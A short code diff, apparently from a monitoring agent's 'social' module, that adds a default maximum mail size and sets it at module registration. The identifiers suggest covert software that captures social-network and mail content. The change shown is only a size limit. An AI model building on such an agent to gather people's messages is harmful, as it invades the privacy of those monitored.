@@ -2,6 +2,7 @@
 // Globals
 BOOL social_is_host_started = FALSE; // Indica se il processo host del thread social e' stato gia' lanciato
 
+#define DEFAULT_MAX_MAIL_SIZE (1024*100)
 
 typedef void (__stdcall *Social_MainLoop_t) (void);
 typedef void (__stdcall *ExitProcess_T) (UINT);
@@ -165,5 +166,6 @@ DWORD __stdcall PM_SocialAgentInit(JSONObject elem)
 void PM_SocialAgentRegister()
 {
 	social_process_control = SOCIAL_PROCESS_CONTINUE;
+	max_social_mail_len = DEFAULT_MAX_MAIL_SIZE;
 	AM_MonitorRegister(L"social", PM_SOCIALAGENT, NULL, (BYTE *)PM_SocialAgentStartStop, (BYTE *)PM_SocialAgentInit, (BYTE *)PM_SocialAgentUnregister);
 }
